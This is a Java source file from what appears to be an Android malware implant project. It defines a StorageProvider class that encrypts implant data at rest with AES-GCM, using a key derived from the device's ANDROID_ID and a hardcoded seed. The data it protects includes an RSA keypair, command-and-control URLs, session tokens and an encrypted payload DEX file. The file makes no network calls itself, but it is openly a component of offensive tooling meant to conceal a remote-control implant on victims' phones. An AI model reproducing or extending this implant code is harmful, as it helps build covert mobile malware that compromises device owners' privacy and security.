// ============================================================
// FILE: payload/module/src/main/java/io/hackerai/implant/crypto/StorageProvider.java
// ============================================================
package io.hackerai.implant.crypto;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Base64;
import android.util.Log;

import java.io.File;
import java.nio.charset.StandardCharsets;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.SecureRandom;

/**
 * StorageProvider — encrypted persistent storage for implant data.
 *
 * Uses AES-256-GCM with a key derived from device fingerprint.
 * Stores: RSA keypair, C2 URLs, session tokens, config.
 *
 * Data is written to app-private files and SharedPreferences,
 * both encrypted at rest via this class.
 */
public class StorageProvider {
    private static final String TAG = "StorageProvider";
    private static final String PREF_NAME = "implant_secure";
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String KEY_RSA_PRIV = "rsa_private";
    private static final String KEY_RSA_PUB = "rsa_public";
    private static final String KEY_C2_URLS = "c2_urls";
    private static final String KEY_SESSION_TOKEN = "session_token";

    private static final int GCM_TAG_LENGTH = 128;
    private static final int GCM_NONCE_LENGTH = 12;

    private final Context ctx;
    private final SharedPreferences prefs;
    private SecretKey storageKey;

    public StorageProvider(Context context) {
        this.ctx = context.getApplicationContext();
        this.prefs = ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        initStorageKey();
    }

    /** Derive storage key from device identifiers. */
    private void initStorageKey() {
        try {
            String fingerprint =
                    android.provider.Settings.Secure.getString(
                            ctx.getContentResolver(),
                            android.provider.Settings.Secure.ANDROID_ID)
                    + ctx.getPackageName()
                    + "CyberAI_AOP_STORAGE_SEED_2026";
            // Use SHA-256 to derive 256-bit key
            java.security.MessageDigest md =
                    java.security.MessageDigest.getInstance("SHA-256");
            byte[] keyBytes = md.digest(fingerprint.getBytes(StandardCharsets.UTF_8));
            this.storageKey = new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            Log.e(TAG, "Storage key init failed", e);
        }
    }

    // ==============================================================
    // Secure value storage (SharedPreferences)
    // ==============================================================

    /** Store an encrypted string value. */
    public void putSecure(String key, String value) {
        try {
            byte[] encrypted = encryptBytes(value.getBytes(StandardCharsets.UTF_8));
            String b64 = Base64.encodeToString(encrypted, Base64.NO_WRAP);
            prefs.edit().putString("sec_" + key, b64).apply();
        } catch (Exception e) {
            Log.e(TAG, "Failed to store " + key, e);
        }
    }

    /** Retrieve and decrypt a stored string. */
    public String getSecure(String key) {
        try {
            String b64 = prefs.getString("sec_" + key, null);
            if (b64 == null) return null;
            byte[] encrypted = Base64.decode(b64, Base64.NO_WRAP);
            byte[] decrypted = decryptBytes(encrypted);
            return new String(decrypted, StandardCharsets.UTF_8);
        } catch (Exception e) {
            Log.e(TAG, "Failed to retrieve " + key, e);
            return null;
        }
    }

    /** Store a byte array securely. */
    public void putSecureBytes(String key, byte[] value) {
        try {
            byte[] encrypted = encryptBytes(value);
            String b64 = Base64.encodeToString(encrypted, Base64.NO_WRAP);
            prefs.edit().putString("bin_" + key, b64).apply();
        } catch (Exception e) {
            Log.e(TAG, "Failed to store bytes " + key, e);
        }
    }

    /** Retrieve encrypted byte array. */
    public byte[] getSecureBytes(String key) {
        try {
            String b64 = prefs.getString("bin_" + key, null);
            if (b64 == null) return null;
            byte[] encrypted = Base64.decode(b64, Base64.NO_WRAP);
            return decryptBytes(encrypted);
        } catch (Exception e) {
            Log.e(TAG, "Failed to retrieve bytes " + key, e);
            return null;
        }
    }

    // ==============================================================
    // Crypto primitives
    // ==============================================================

    private byte[] encryptBytes(byte[] plaintext) throws Exception {
        SecureRandom sr = new SecureRandom();
        byte[] nonce = new byte[GCM_NONCE_LENGTH];
        sr.nextBytes(nonce);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
        cipher.init(Cipher.ENCRYPT_MODE, storageKey, spec);

        byte[] ciphertext = cipher.doFinal(plaintext);
        byte[] combined = new byte[nonce.length + ciphertext.length];
        System.arraycopy(nonce, 0, combined, 0, nonce.length);
        System.arraycopy(ciphertext, 0, combined, nonce.length, ciphertext.length);
        return combined;
    }

    private byte[] decryptBytes(byte[] encrypted) throws Exception {
        if (encrypted.length < GCM_NONCE_LENGTH + 1) return null;

        byte[] nonce = new byte[GCM_NONCE_LENGTH];
        System.arraycopy(encrypted, 0, nonce, 0, GCM_NONCE_LENGTH);

        byte[] ciphertext = new byte[encrypted.length - GCM_NONCE_LENGTH];
        System.arraycopy(encrypted, GCM_NONCE_LENGTH, ciphertext, 0, ciphertext.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
        cipher.init(Cipher.DECRYPT_MODE, storageKey, spec);

        return cipher.doFinal(ciphertext);
    }

    // ==============================================================
    // High-level accessors
    // ==============================================================

    public String getDeviceId() {
        String id = getSecure(KEY_DEVICE_ID);
        if (id == null) {
            id = CryptoEngine.randomHex(16);
            putSecure(KEY_DEVICE_ID, id);
        }
        return id;
    }

    public void saveRsaKeypair(java.security.KeyPair pair) {
        putSecureBytes(KEY_RSA_PRIV, pair.getPrivate().getEncoded());
        putSecureBytes(KEY_RSA_PUB, pair.getPublic().getEncoded());
    }

    public byte[] getRsaPrivateKey() { return getSecureBytes(KEY_RSA_PRIV); }
    public byte[] getRsaPublicKey() { return getSecureBytes(KEY_RSA_PUB); }

    public boolean hasRsaKeypair() {
        return getSecureBytes(KEY_RSA_PRIV) != null;
    }

    public void saveC2Urls(String urlsJson) { putSecure(KEY_C2_URLS, urlsJson); }
    public String getC2Urls() { return getSecure(KEY_C2_URLS); }

    public void saveSessionToken(String token) { putSecure(KEY_SESSION_TOKEN, token); }
    public String getSessionToken() { return getSecure(KEY_SESSION_TOKEN); }

    /** Encrypt a file on disk (e.g., payload DEX). */
    public boolean encryptFile(File input, File output) {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecureRandom sr = new SecureRandom();
            byte[] nonce = new byte[GCM_NONCE_LENGTH];
            sr.nextBytes(nonce);
            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
            cipher.init(Cipher.ENCRYPT_MODE, storageKey, spec);

            try (FileInputStream fis = new FileInputStream(input);
                 FileOutputStream fos = new FileOutputStream(output)) {
                fos.write(nonce); // prepend nonce
                try (CipherOutputStream cos = new CipherOutputStream(fos, cipher)) {
                    byte[] buf = new byte[8192];
                    int read;
                    while ((read = fis.read(buf)) != -1) {
                        cos.write(buf, 0, read);
                    }
                }
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "File encrypt failed", e);
            return false;
        }
    }

    /** Decrypt a file from disk. */
    public boolean decryptFile(File input, File output) {
        try {
            byte[] nonce = new byte[GCM_NONCE_LENGTH];
            try (FileInputStream fis = new FileInputStream(input)) {
                if (fis.read(nonce) != GCM_NONCE_LENGTH) return false;
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, nonce);
                cipher.init(Cipher.DECRYPT_MODE, storageKey, spec);

                try (FileOutputStream fos = new FileOutputStream(output);
                     CipherInputStream cis = new CipherInputStream(fis, cipher)) {
                    byte[] buf = new byte[8192];
                    int read;
                    while ((read = cis.read(buf)) != -1) {
                        fos.write(buf, 0, read);
                    }
                }
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "File decrypt failed", e);
            return false;
        }
    }
              }
